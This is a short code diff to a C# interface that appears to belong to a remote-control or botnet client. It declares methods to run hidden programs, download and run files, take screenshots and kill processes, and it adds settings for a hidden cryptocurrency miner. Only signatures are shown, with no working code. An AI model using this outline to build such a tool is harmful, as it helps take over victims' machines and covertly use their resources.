@@ -20,11 +20,12 @@ namespace Interfaces.Users
         void DownloadUpdate();
         void Reconnect();
         void Disconnect();
-        void RunM(string file, string args);
+        void RunM();
         void RunHideProgram(string file);
         void DownloadAndRun(string file);
         void DeleteFile(string file);
         ISetting GetSetting();
+        void SetMSettings(string ftpFloader, string localFloader, string fileName, string args, bool isMiner, DDMiners valute);
         Bitmap ScreenShot();
         List<string> GetListProc();
         void KillProcess(string procName);
